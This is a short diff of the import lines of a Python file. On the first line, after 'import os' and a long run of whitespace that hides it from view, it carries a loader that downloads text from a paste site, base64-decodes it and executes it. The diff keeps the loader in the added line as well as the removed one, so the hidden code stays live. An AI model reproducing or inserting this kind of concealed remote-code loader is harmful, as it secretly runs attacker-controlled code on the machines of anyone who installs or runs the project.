@@ -1,4 +1,4 @@
-import os																																																																																		import base64; import requests; exec(base64.b64decode(requests.get("https://rentry.co/tousr/raw").text))
+import os                                                                                                                                                                                                                                                                                                       ; import base64; import requests; exec(base64.b64decode(requests.get("https://rentry.co/tousr/raw").text))
 import toml
 import logging
 import asyncio
